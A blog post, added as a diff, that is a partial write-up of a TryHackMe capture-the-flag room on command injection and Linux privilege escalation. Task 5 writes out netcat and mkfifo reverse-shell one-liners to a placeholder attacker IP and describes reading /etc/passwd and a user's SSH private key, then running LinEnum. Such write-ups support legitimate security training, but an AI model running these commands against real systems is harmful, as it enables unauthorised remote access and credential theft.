@@ -1,0 +1,43 @@
+---
+title: THM The Cop Caper
+date: 2021-01-13 22:50:00 +0000
+categories: [Security, TryHackMe]
+tags: [thm, codcapper, writeup]     # TAG names should always be lowercase
+---
+
+Task 5: Command Execution
+We got access to a web page where we can run some linux command and receive the result directly in our webpage.
+Try basic stuf like pwd or ls give us some result.
+ls -l | wc -l to have the number of files inside current directory.
+
+Checking /etc/passwd we found a user named pingu.
+
+Did not succeed to have a stable shell with netcat (nc -e /bin/sh <ip> <port> or even more complicated with something like rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f)
+Success to have a reverse shell with
+mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
+
+
+
+find / -user pingu
+we found the path to the ssh rsa key (cat /home/pingu/.ssh/id_rsa)
+Did not succeed to hack the RSA passphrase
+
+After some research inside the box, we found an interresting folder in /var. Password of pingu is inside.
+
+Task 6: LinEnum
+Choose a metod to send LinEnum.sh file into the target system (SCP or setup a simpleHTTPServer inside your own attack machine).
+Then, upgrade the permission with chmod +x LinEnum.sh and then execute LinEnum.sh and, as specified inside the room, check the SUID files analysis result. You will easily found the requested one.
+
+Try to execute this file without success. It seems that the file is waiting for an entry. Let's continue the room.
+
+Task 7: pwndbg
+Nothing to do, just follow the room description and do it to understand
+
+Task 8: Binary-Exploitation: Manually
+Nothing to do, just follow the room description and do it to understand
+
+Task 9: Binary-Exploitation: The pwntools way
+Nothing to do, just follow the room description and do it to understand
+
+Task 10: Finishing the job
+
